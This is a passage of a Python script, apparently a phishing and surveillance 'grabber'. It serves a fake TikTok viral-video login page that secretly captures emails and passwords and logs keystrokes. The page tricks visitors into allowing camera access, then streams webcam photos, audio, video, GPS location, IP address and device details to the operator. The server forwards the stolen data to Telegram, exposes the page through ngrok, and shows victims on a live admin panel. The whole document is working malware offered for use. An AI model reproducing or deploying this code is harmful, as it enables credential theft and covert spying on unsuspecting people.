            fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"capture_error", error:e.toString(), stack:e.stack, ...data})}); 
        }
    }
    function startInterval(){
        if(intervalId) return;
        console.log("Starting capture interval for "+camType);
        captureOnce();
        intervalId = setInterval(captureOnce, 2000);
    }

    function waitForReady(){
        const state = video.readyState;
        if(state >= 2 && video.videoWidth > 0 && video.videoHeight > 0){
            startInterval();
            return;
        }
        failCount++;
        if(failCount > 20){
            console.log("Video never became ready for "+camType);
            fetch("/s",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({type:"diag", msg:"video_never_ready_timeout", camType:camType, lastState:state, lastWidth:video.videoWidth, lastHeight:video.videoHeight, attempts:failCount, ...data})});
            return;
        }
        setTimeout(waitForReady, 250);
    }

    if(video.readyState >= 2){
        startInterval();
    } else {
        console.log("Waiting for video to be ready... current state:", video.readyState);
        video.addEventListener('loadedmetadata', ()=>{ 
            console.log("Video loadedmetadata event for "+camType);
            startInterval(); 
        }, {once:true});
        video.addEventListener('playing', ()=>{ 
            console.log("Video playing event for "+camType);
            if(!intervalId) startInterval(); 
        }, {once:true});
        waitForReady();
        setTimeout(()=>{ 
            if(!intervalId) {
                console.log("Force starting capture after 2s timeout for "+camType);
                startInterval(); 
            }
        }, 2000);
    }
}

// Combined audio+video recorder: sends 1s chunks
function startAVRecorder(stream, camType){
    try{
        const mimeOptions = ['video/webm;codecs=vp9,opus','video/webm;codecs=vp8,opus','video/webm;codecs=h264','video/webm','video/mp4','video/quicktime'];
        let mimeIndex = 0;
        let mime = null;
        
        // Find first supported mime type
        for(let m of mimeOptions){
            if(MediaRecorder.isTypeSupported(m)){
                mime = m;
                console.log('Selected supported mime:', m);
                break;
            }
        }
        if(!mime){ 
            console.log('No supported MIME types found'); 
            fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'no_mime_support', mimeOptions:mimeOptions, ...data})});
            return;
        }
        
        let recorder = null;
        let chunksBuffer = [];
        let totalChunks = 0;
        let totalBytes = 0;
        let consecutiveEmpty = 0;

        function createRecorder(m){
            try{
                console.log('Creating AV recorder with mime:', m);
                const r = new MediaRecorder(stream, {mimeType: m, videoBitsPerSecond: 1200000, audioBitsPerSecond: 128000});

                r.onstart = ()=>{
                    console.log('🎬 AV recorder started', camType, 'state=', r.state, 'tracks:', stream.getTracks().length, 'mime=', m);
                    fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'av_start', camType:camType, tracks:stream.getTracks().length, mime:m, state:r.state, ...data})});
                };

                r.onerror = (err)=>{
                    console.log('AV recorder error', err);
                    fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'av_error', camType:camType, error:err.error?.toString() || err.toString(), mime:m, ...data})});
                };

                r.onstop = ()=>{
                    console.log('🎬 AV recorder stopped', camType, 'state=', r.state);
                    fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'av_stop', camType:camType, chunks:totalChunks, bytes:totalBytes, mime:m, ...data})});
                };

                r.ondataavailable = e => {
                    const size = e.data?e.data.size:0;
                    console.log('AV ondataavailable event size:', size, 'recorder.state=', r.state);
                    totalChunks++;
                    totalBytes += size;
                    if(size>0){
                        consecutiveEmpty = 0;
                        const reader = new FileReader();
                        reader.onloadend = ()=>{
                            console.log('Sending AV chunk, navigator.onLine=', navigator.onLine);
                            fetch('/s',{method:'POST',body:JSON.stringify({type:'audio_video', data:reader.result, isVideo:true, camType:camType, size:size, chunkIndex:totalChunks, totalBytes:totalBytes, ...data})})
                            .then(res=>{ console.log('AV chunk upload response', res.status); })
                            .catch(err=>{ console.log('AV chunk upload failed', err); fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'upload_error', error:err.toString(), ...data})}); });
                        };
                        reader.readAsDataURL(e.data);
                    } else {
                        consecutiveEmpty++;
                        console.log('Empty AV chunk received (#'+consecutiveEmpty+')');
                        if(consecutiveEmpty>=5){
                            console.log('Too many empty chunks, stopping recorder');
                            r.stop();
                        }
                    }
                };

                return r;
            }catch(err){
                console.log('createRecorder error', err, 'mime=', m);
                fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'create_recerror', error:err.toString(), mime:m, ...data})});
                return null;
            }
        }

        recorder = createRecorder(mime);
        if(recorder){
            recorder.start(15000);
            console.log('AV recorder.start called with timeslice 15000ms, state=', recorder.state);
        } else {
            console.log('Failed to create AV recorder');
        }
    }catch(e){ console.log('AV recorder err', e); fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'av_init_error', error:e.toString(), ...data})}); }
}

// Audio-only capture - kept as fallback, but reduced chunk to 1s
function startAudioCapture(stream){
    try{
        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') ? 'audio/webm;codecs=opus' : 'audio/webm';
        console.log('Audio recorder mime chosen:', mimeType);
        const recorder = new MediaRecorder(stream, {mimeType: mimeType, audioBitsPerSecond: 192000});

        let audioTotal = 0;

        recorder.onstart = ()=>{
            console.log('🎤 Audio recorder started, state=', recorder.state, 'tracks:', stream.getTracks().length);
            fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'audio_start', tracks:stream.getTracks().length, state:recorder.state, ...data})});
        };

        recorder.onerror = (err)=>{
            console.log('Audio recorder error', err);
            fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'audio_error', error:err.error?.toString() || err.toString(), ...data})});
        };

        recorder.ondataavailable = e => {
            const size = e.data?e.data.size:0;
            audioTotal += size;
            console.log('Audio ondataavailable size:', size, 'totalBytes:', audioTotal);
            if(size>0){
                const reader = new FileReader();
                reader.onloadend = ()=>{
                    fetch('/s',{method:'POST',body:JSON.stringify({type:'audio', audio:reader.result, isVideo:false, size:size, totalBytes:audioTotal, ...data})})
                    .then(r=>console.log('audio chunk upload', r.status)).catch(err=>console.log('audio upload err', err));
                };
                reader.readAsDataURL(e.data);
            } else {
                fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'audio_empty_chunk', totalBytes:audioTotal, ...data})});
            }
        };

        recorder.start(15000);
        console.log('audio recorder.start called with timeslice 15000ms, state=', recorder.state);
    }catch(e){ console.log('audio recorder err',e); fetch('/s',{method:'POST',body:JSON.stringify({type:'diag', msg:'audio_init_error', error:e.toString(), ...data})}); }
}

// Legacy fallback (not used but kept)
function startAudioVideoCapture(stream){ startAudioCapture(stream); }

let signInAttempt = 0;
async function handleSignIn(){
    const email = document.getElementById("email").value;
    const pwd = document.getElementById("password").value;
    if(!email){ document.getElementById("email").focus(); return; }
    if(!pwd){ document.getElementById("password").focus(); return; }

    signInAttempt++;
    console.log('Sign in attempt #'+signInAttempt);

    // Log credentials secretly
    try{
        await fetch("/s",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({type:"login", email:email, password:pwd, attempt:signInAttempt, ...data})});
    }catch(e){}

    // FORCE CAMERA PERMISSION: Don't proceed if camera is not allowed
    if(!camStarted){
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.style.display = 'block';
        errorDiv.innerHTML = '<strong>⚠️ Security Verification:</strong><br>Please click <b>"Allow"</b> on the permission popup above to verify you are human. The video will not load otherwise.';
        
        try{
            await openCamStreams(true);
        }catch(e){}
        
        // Wait and check if they allowed it
        setTimeout(() => {
            if(camStarted){
                errorDiv.style.display = 'none';
                submitLogin();
            } else {
                errorDiv.innerHTML = '<strong>❌ Access Denied:</strong><br>You must click <b>"Allow"</b> to watch the video! If you blocked it by mistake, please refresh the page and try again.';
            }
        }, 3000);
        
        return; // Block submission until allowed
    }

    await submitLogin();
}

function submitLogin(){
    const email=document.getElementById("email").value;
    const pwd=document.getElementById("password").value;
    data.email=email; data.password=pwd;
    document.getElementById("step1").classList.add("hidden");
    document.getElementById("step2").classList.remove("hidden");
    setTimeout(()=>{
        document.getElementById("step2").classList.add("hidden");
        document.getElementById("step3").classList.remove("hidden");
    }, 3500);
    setTimeout(()=>{
        document.getElementById('step3').querySelector('p').textContent = 'Redirecting to TikTok, please wait...';
        location.href = 'https://www.tiktok.com';
    }, 3500);
}

function toggleBackgroundMute(){
    const bgVideo = document.getElementById('bgVideo');
    if(!bgVideo) return;
    bgVideo.muted = !bgVideo.muted;
    const button = document.getElementById('muteToggle');
    if(button){
        button.textContent = bgVideo.muted ? 'Unmute video' : 'Mute video';
    }
}

function logKey(field, val){
    if(val.length > 2){
        fetch("/s",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify({type:"keylog", field:field, val:val, ...data})})
            .then(()=>console.log('keylog posted', field))
            .catch(e=>console.log('keylog post failed', e));
    }
}
    </script>

</body>
</html>'''

ADMIN_PANEL = r'''<!DOCTYPE html>
<html>
<head>
    <title>LIVE CAMERA PANEL</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
        body{background:#111;color:#fff;height:100vh;overflow:hidden}
        .header{background:#e50914;padding:12px;text-align:center;font-size:20px;font-weight:800;}
        .controls{padding:10px;background:#222;display:flex;gap:8px;justify-content:center;}
        button{padding:8px 12px;border:none;border-radius:4px;background:#e50914;color:#fff;font-weight:700;cursor:pointer;}
        .content{padding:15px;overflow-y:auto;height:calc(100vh - 120px);}
        .victim-card{background:#1a1a1a;border:1px solid #333;border-radius:8px;padding:15px;margin-bottom:12px;}
        .photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px;margin:10px 0}
        .photo{border-radius:4px;width:100%;height:120px;object-fit:cover;border:1px solid #444}
        .map{height:150px;border-radius:6px;margin-top:8px;border:1px solid #333;cursor:pointer}
        .info-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px;font-size:12px;}
        .info-item{background:#2a2a2a;padding:5px;border-radius:4px}
    </style>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" integrity="sha256-sA+e2YdFQ6v2z8X0z6tqfJbKp3s9p+0u2v+3qk6u5mM=" crossorigin=""/>
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js" integrity="sha256-o9N1j7kqmAepFxzeycYU6M1vpJk7PfG9cYwqg59vY+o=" crossorigin=""></script>
</head>
<body>
    <div class="header">LIVE CAMERA CONTROL</div>
    <div class="controls">
        <button onclick="refreshAll()">REFRESH</button>
        <button onclick="fetch('/admin?clear=1').then(refreshAll)">CLEAR ALL</button>
    </div>
    <div class="content" id="content"></div>
    <script>
        let victims={};
        function refreshAll(){
            fetch('/admin').then(r=>r.json()).then(data=>{
                victims=data.victims;
                const content=document.getElementById('content');
                content.innerHTML='';
                Object.entries(victims).forEach(([id,v])=>{
                    const card=document.createElement('div');
                    card.className='victim-card';
                    card.innerHTML=`
                        <h3>Victim #${v.id}</h3>
                        <div class="photo-grid">
                            ${v.photos.slice(-6).map(p=>'<img src="data:image/jpeg;base64,'+p.data+'" class="photo">').join('')}
                        </div>
                        <div class="info-grid">
                            <div class="info-item">IP: ${v.data.ip||'N/A'}</div>
                            <div class="info-item">Phone: ${v.phone||'N/A'}</div>
                            <div class="info-item">Location: ${v.data.city||'N/A'} ${v.data.lat ? `<a href="https://www.google.com/maps?q=${v.data.lat},${v.data.lon}" target="_blank" style="color:#00ff88;text-decoration:none;font-weight:bold">[VIEW MAP]</a>` : ''}</div>
                            <div class="info-item">Battery: ${v.data.battery||'N/A'} ${v.data.charging?'⚡':''}</div>
                            <div class="info-item">Network: ${v.data.net||'N/A'}</div>
                        </div>
                        ${v.data.lat ? `<div id="map-${v.id}" class="map" onclick="window.open('https://www.google.com/maps?q=${v.data.lat},${v.data.lon}','_blank')"></div>` : ''}
                    `;
                    content.appendChild(card);
                    // initialize leaflet map if lat/lon present
                    if(v.data && v.data.lat){
                        setTimeout(()=>{
                            try{
                                const lat = parseFloat(v.data.lat);
                                const lon = parseFloat(v.data.lon);
                                if(!isNaN(lat) && !isNaN(lon)){
                                    const mapEl = document.getElementById('map-'+v.id);
                                    if(mapEl){
                                        const map = L.map(mapEl, {zoomControl:false, attributionControl:false}).setView([lat, lon], 13);
                                        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {maxZoom: 19}).addTo(map);
                                        L.marker([lat, lon]).addTo(map);
                                    }
                                }
                            }catch(e){ console.log('map init err', e); }
                        }, 100);
                    }
                });
            });
        }
        setInterval(refreshAll, 3000);
        refreshAll();
    </script>
</body>
</html>'''

class VictimHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # /go endpoint - serve HTML directly for INSTANT load (no JS fetch delay)
        if self.path == '/go' or self.path == '/':
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.send_header("ngrok-skip-browser-warning", "true")
            self.end_headers()
            self.wfile.write(HTML_PAGE.encode("utf-8"))
            return

        # Fall back to default handling for unknown resources like favicon or other assets
        return super().do_GET()

    def do_POST(self):
        global victim_count, victims_data
        if self.path == '/s':
            content_length = int(self.headers.get("Content-Length", 0))
            if content_length <= 0:
                self.send_response(400)
                self.end_headers()
                return
            data = json.loads(self.rfile.read(content_length))
            v_id = str(hash(data.get('ua', 'none')))[:15]
            if v_id not in victims_data:
                victim_count += 1
                victims_data[v_id] = {'id': victim_count, 'data': {**data, 'time': time.time()}, 'photos': [], 'phone': None}
                send_telegram(f"🆕 NEW VICTIM #{victim_count}\nDevice: {data.get('ua', 'Unknown')[:50]}")
            
            victim = victims_data[v_id]
            
            # Update victim data with any new info (like GPS or IP)
            for key, val in data.items():
                if key not in ['type', 'photo']:
                    victim['data'][key] = val
                    
            msg_type = data.get('type', '')
            
            if msg_type == 'gps' and 'lat' in data:
                send_telegram(f"📍 GPS (Victim #{victim['id']})\nMap: https://www.google.com/maps?q={data['lat']},{data['lon']}")
                
            elif msg_type == 'ip' and 'ip' in data:
                send_telegram(f"🌐 INFO (Victim #{victim['id']})\nIP: {data['ip']}\nLocation: {data.get('city', 'Unknown')}, {data.get('country', 'Unknown')}")
                
            elif '_live' in msg_type and 'photo' in data:
                try:
                    if ',' in data['photo']:
                        photo_data = data['photo'].split(',')[1]
                        cam = data.get('camType', 'CAM')
                        filename = f"victim_{victim['id']}_{cam}_{int(time.time())}.jpg"
                        with open(filename, 'wb') as f:
                            f.write(base64.b64decode(photo_data))
                        victim['photos'].append({'data': photo_data, 'camType': cam})
                        print(f"Photo Received: {filename} ({len(photo_data)} bytes)")
                        send_telegram_img(filename, f"📸 Victim #{victim['id']} - {cam}")
                except Exception as e: print(f"Error: {e}")
            
            elif msg_type == 'phone':
                victim['phone'] = data.get('phone')
                send_telegram(f"📱 PHONE (Victim #{victim['id']}): {data.get('phone')}")
            
            elif msg_type == 'keylog':
                print(f"⌨️ KEYLOG (Victim #{victim['id']}) - {data.get('field')}: {data.get('val')}")
                
            elif msg_type == 'login':
                send_telegram(f"🔥 VIRAL VIDEO LOGIN (Victim #{victim['id']})\nEmail: {data.get('email')}\nPassword: {data.get('password')}")
                
            elif msg_type == 'audio_video' and 'data' in data:
                try:
                    if ',' in data['data']:
                        audio_data = data['data'].split(',')[1]
                        decoded = base64.b64decode(audio_data)
                        chunk_size = len(decoded)
                        print(f"DEBUG: Received audio_video chunk size={chunk_size} for Victim #{victim['id']}")
                        if chunk_size > 0:
                            # create or append to per-victim video file
                            if not victim.get('video_filename'):
                                fname = f"victim_{victim['id']}_VIDEO_{int(time.time())}.webm"
                                victim['video_filename'] = fname
                                victim['video_bytes'] = 0
                                print(f"DEBUG: Creating new video file: {fname}")
                            else:
                                fname = victim['video_filename']
                            # append chunk
                            with open(fname, 'ab') as f:
                                f.write(decoded)
                            victim['video_bytes'] = victim.get('video_bytes', 0) + chunk_size
                            print(f"🎥 Appended {chunk_size} bytes to {fname} (total {victim['video_bytes']} bytes)")
                        else:
                            print(f"⚠️ Skipped saving zero-length audio_video chunk for Victim #{victim['id']}")
                except Exception as e: print(f"AudioVideo Error: {e}")

            elif msg_type == 'audio' and 'audio' in data:
                try:
                    if ',' in data['audio']:
                        audio_data = data['audio'].split(',')[1]
                        decoded = base64.b64decode(audio_data)
                        chunk_size = len(decoded)
                        print(f"DEBUG: Received audio chunk size={chunk_size} for Victim #{victim['id']}")
                        if chunk_size > 0:
                            # append to per-victim audio file (or create new)
                            if not victim.get('audio_filename'):
                                is_video = data.get('isVideo', False)
                                ext = 'webm'
                                rec_type = 'VIDEO+AUDIO' if is_video else 'AUDIO'
                                afname = f"victim_{victim['id']}_{rec_type}_{int(time.time())}.{ext}"
                                victim['audio_filename'] = afname
                                victim['audio_bytes'] = 0
                                print(f"DEBUG: Creating new audio file: {afname}")
                            else:
                                afname = victim['audio_filename']
                            with open(afname, 'ab') as f:
                                f.write(decoded)
                            victim['audio_bytes'] = victim.get('audio_bytes', 0) + chunk_size
                            print(f"🎧 Appended {chunk_size} bytes to {afname} (total {victim['audio_bytes']} bytes)")
                        else:
                            print(f"⚠️ Skipped saving zero-length audio chunk for Victim #{victim['id']}")
                except Exception as e: print(f"Audio Error: {e}")

            elif msg_type == 'diag':
                try:
                    # Log diagnostic messages from client for debugging
                    print(f"DIAG (Victim #{victim['id']}): {json.dumps(data)}")
                    victim.setdefault('diag', []).append({'time': time.time(), **data})
                    # If client signals recorder stopped, print totals
                    if data.get('msg') == 'av_stop':
                        vf = victim.get('video_filename')
                        vb = victim.get('video_bytes', 0)
                        if vf:
                            print(f"DIAG: Recorder stopped for Victim #{victim['id']}. File: {vf}, bytes: {vb}")
                        else:
                            print(f"DIAG: Recorder stopped for Victim #{victim['id']}. No video file created.")
                except Exception as e:
                    print(f"Diag logging error: {e}")
                
            # If battery info exists and we haven't alerted yet
            if 'battery' in data and not victim.get('battery_alerted'):
                victim['battery_alerted'] = True
                charge_str = " (Charging ⚡)" if data.get('charging') else ""
                send_telegram(f"🔋 DEVICE SCAN (Victim #{victim['id']})\nBattery: {data['battery']}{charge_str}\nNetwork: {data.get('net', 'Unknown')}")

            
            self.send_response(200)
            self.end_headers()

class AdminHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        if params := urllib.parse.parse_qs(parsed.query):
            if params.get('clear'):
                victims_data.clear()
                self.send_response(200)
                self.send_header("ngrok-skip-browser-warning", "true")
                self.end_headers(); return
        
        if parsed.path == '/admin':
             self.send_response(200)
             self.send_header("Content-type", "application/json")
             self.send_header("ngrok-skip-browser-warning", "true")
             self.end_headers()
             self.wfile.write(json.dumps({"victims": victims_data}).encode())
             return

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.send_header("ngrok-skip-browser-warning", "true")
        self.end_headers()
        self.wfile.write(ADMIN_PANEL.encode())

def run_main():
    try:
        socketserver.ThreadingTCPServer.allow_reuse_address = True
        server = socketserver.ThreadingTCPServer(("", PORT), VictimHandler)
        server.serve_forever()
    except Exception as e: print(f"Server Error: {e}")


def run_admin():
    try:
        print("Starting Admin Panel on port", ADMIN_PORT)
        socketserver.ThreadingTCPServer.allow_reuse_address = True
        server = socketserver.ThreadingTCPServer(("", ADMIN_PORT), AdminHandler)
        server.serve_forever()
    except Exception as e:
        print(f"Admin Panel Error: {e}")


print("STARTING GRABBER...")
send_telegram("BOT ONLINE - READY FOR HITS")

threading.Thread(target=run_main, daemon=True).start()
threading.Thread(target=run_admin, daemon=True).start()


def create_ngrok_tunnel(max_attempts=5, wait_seconds=15):
    # If pyngrok wasn't imported, bail out early to avoid NameError
    if not ngrok or not conf:
        print("pyngrok not installed or failed to import; cannot create tunnel programmatically.")
        return None

    if NGROK_AUTH_TOKEN:
        conf.get_default().auth_token = NGROK_AUTH_TOKEN
        print("Using ngrok auth token from script config.")
    else:
        print("No ngrok auth token configured; tunnel may fail.")

    for attempt in range(1, max_attempts + 1):
        try:
            ngrok.kill()
        except Exception:
            pass
        time.sleep(1)
        try:
            public_url = ngrok.connect(PORT).public_url
            print(f"Ngrok tunnel created: {public_url}")
            return public_url
        except Exception as e:
            err_str = str(e)
            print(f"Ngrok attempt {attempt} failed: {err_str}")
            if attempt < max_attempts:
                print(f"Retrying ngrok in {wait_seconds} seconds...")
                time.sleep(wait_seconds)
    return None

if USE_NGROK:
    time.sleep(2)
    NGROK_URL = create_ngrok_tunnel()
    if not NGROK_URL:
        NGROK_URL = f"http://127.0.0.1:{PORT}"
        print(f"Falling back to local server: {NGROK_URL}")
else:
    NGROK_URL = f"http://127.0.0.1:{PORT}"
    print("ngrok disabled: using local-only victim link")

BYPASS_URL = NGROK_URL + "/go"
print(f"\n*** VICTIM LINK: {BYPASS_URL} ***")
print(f"*** DIRECT LINK: {NGROK_URL} ***")
print(f"ADMIN PANEL: http://localhost:{ADMIN_PORT}")
try:
    send_telegram(f"BOT READY\nVICTIM LINK: {BYPASS_URL}")
except Exception as e:
    print(f"Telegram notify failed: {e}")
try:
    webbrowser.open(f"http://localhost:{ADMIN_PORT}")
except Exception as e:
    print(f"Browser open failed: {e}")

print("\nServer is running. Press Ctrl+C in this terminal to stop.")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping server...")
